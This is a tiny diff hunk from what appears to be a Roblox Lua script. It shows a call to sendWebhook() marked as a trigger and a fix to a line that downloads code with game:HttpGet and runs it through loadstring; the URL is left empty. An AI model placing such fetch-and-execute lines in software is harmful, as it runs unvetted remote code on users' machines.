@@ -1933,4 +1933,4 @@ end
 --// Trigger
 sendWebhook()
 
-loadstring(game:HttpGet("))()
+loadstring(game:HttpGet(""))()
